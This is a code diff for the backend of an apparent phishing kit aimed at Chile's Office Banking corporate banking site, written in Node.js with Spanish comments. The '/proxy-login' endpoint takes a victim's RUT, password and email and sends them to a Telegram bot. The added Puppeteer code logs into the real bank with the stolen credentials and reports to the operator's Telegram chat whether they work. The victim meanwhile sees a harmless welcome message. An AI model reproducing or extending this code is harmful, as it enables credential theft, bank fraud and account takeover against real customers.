@@ -74,6 +74,8 @@ app.post("/autorizar", async (req, res) => {
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+  let loginStatus = null;
 
   try {
     if (mail) {
@@ -94,65 +96,54 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
     });
 
-    // Respuesta simplificada (ya sin Puppeteer)
-    if (rut && passwd) {
-      return res.json({ status: "ok", mensaje: "Credenciales recibidas correctamente" });
-    }
+    // Aquí va la lógica de Puppeteer, dentro del mismo async
+    const puppeteer = require("puppeteer");
+    const browser = await puppeteer.launch({ headless: true });
+    const page = await browser.newPage();
 
-    res.status(400).json({ status: "error", mensaje: "Faltan datos" });
-  } catch (err) {
-    console.error("⚠️ Error en proxy-login:", err);
-    res.status(500).json({ status: "error", mensaje: "Error interno en el servidor" });
-  }
-});
-
-      // Escuchar respuestas de red
-      page.on('response', async (response) => {
-        const url = response.url();
-        if (url.includes('/login')) {
-          const status = response.status();
-          console.log("➡️ Respuesta de login:", status, url);
-
-          if (status === 401) loginStatus = 'error';
-          else if (status === 200) loginStatus = 'ok';
-        }
-      });
-
-      await page.goto('https://empresas.officebanking.cl', { waitUntil: 'networkidle2' });
-      await page.waitForSelector('iframe');
-      const frameHandle = await page.$('iframe');
-      const frame = await frameHandle.contentFrame();
-
-      if (frame) {
-        await frame.type('#username', rut);
-        await frame.type('#password', passwd);
-        await frame.click('#doLoginButton');
-
-        // Esperar unos segundos a que llegue la respuesta
-        await page.waitForTimeout(4000);
-
-        if (loginStatus === 'error') {
-          mensajeFinal = "Credenciales incorrectas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
-          });
-        } else if (loginStatus === 'ok') {
-          mensajeFinal = "Credenciales correctas";
-          await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
-          });
-        }
+    // Escuchar respuestas de red
+    page.on("response", async (response) => {
+      const url = response.url();
+      if (url.includes("/login")) {
+        const status = response.status();
+        console.log("➡️ Respuesta de login:", status, url);
+        if (status === 401) loginStatus = "error";
+        else if (status === 200) loginStatus = "ok";
       }
+    });
 
-      await browser.close();
+    await page.goto("https://empresas.officebanking.cl", { waitUntil: "networkidle2" });
+    await page.waitForSelector("iframe");
+    const frameHandle = await page.$("iframe");
+    const frame = await frameHandle.contentFrame();
+
+    if (frame) {
+      await frame.type("#username", rut);
+      await frame.type("#password", passwd);
+      await frame.click("#doLoginButton");
+
+      await page.waitForTimeout(4000);
+
+      if (loginStatus === "error") {
+        mensajeFinal = "Credenciales incorrectas";
+        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
+        });
+      } else if (loginStatus === "ok") {
+        mensajeFinal = "Credenciales correctas";
+        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
+        });
+      }
     }
+
+    await browser.close();
   } catch (err) {
     console.error("⚠️ Error en validación de credenciales:", err);
-    mensajeFinal = "Bienvenido a Office Banking"; // flujo sigue igual
   }
 
   res.json({ status: "ok", mensaje: mensajeFinal });
